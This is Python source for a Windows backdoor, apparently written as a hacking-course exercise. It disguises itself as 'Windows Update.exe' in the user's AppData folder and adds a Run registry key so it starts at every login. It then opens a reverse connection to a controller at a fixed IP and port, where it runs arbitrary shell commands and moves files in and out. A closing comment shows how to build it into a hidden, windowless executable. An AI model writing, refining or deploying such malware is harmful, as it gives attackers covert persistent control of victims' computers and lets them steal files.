#!/usr/bin/env python
import subprocess
import socket
import os
import json
import base64
import sys
import shutil

class Backdoor:
	def __init__(self, ip, port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def become_persistent(self):
		file_location = os.environ["appdata"] + "\\Windows Update.exe"
		if not os.path.exists(file_location):
			shutil.copyfile(sys.executable, file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' +  file_location + '"', shell=True)  #location to go persistent

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command):
		try:
			DEVNULL = open(os.devnull, "wb")
			return subprocess.check_output(command, shell = True, stderr=DEVNULL, stdin=DEVNULL)
			#python 3 ----- return subprocess.check_output(command, shell = True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNUL)
		except:
			return "Command Execution Error"

	def change_directory(self, path):
		os.chdir(path)
		return "[+] Changing Directory to " + path

	def read_file(self, path):   	 	 
		with open(path, "rb") as file:  #read binary files
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "Upload Complete"

#connection.send("[+] Done")

	def run(self):
		while True:
			command = self.reliable_receive()
			if command[0] == "exit":     #exit backdoor on exit command from controller
				self.connection.close()
				exit()
			elif command[0] == "cd" and len(command) > 1:  #change directory
				command_result =  self.change_directory(command[1])
			elif command[0] == "download":  #read and download file
				command_result = self.read_file(command[1])
			elif command[0] == "upload":  #uploading file
				command_result = self.write_file(command[1], command[2])
			else:  #execute commands normally
 				command_result = self.execute_system_command(command)
			
			self.reliable_send(command_result)
		#connection.close()

try:
	my_backdoor = Backdoor("192.168.74.125", 4444)
	my_backdoor.run()
except Error:
	sys.exit()

# scripts/pyinstaller <name>.py --onefile --noconsole